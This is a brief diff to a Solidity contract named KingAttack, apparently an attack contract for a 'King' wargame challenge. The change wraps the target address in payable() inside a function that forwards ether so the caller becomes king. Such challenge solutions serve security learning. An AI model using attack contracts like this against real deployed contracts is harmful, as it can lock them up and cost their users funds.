@@ -6,7 +6,7 @@ pragma solidity ^0.8.15;
 contract KingAttack {
     // use this to become the KING of the contract
     function forwardFunds(address _kingTarget) external payable {
-        (bool success, ) = _kingTarget.call{value: msg.value}("");
+        (bool success, ) = payable(_kingTarget).call{value: msg.value}("");
         require(success, "SEND FAILED");
     }
 
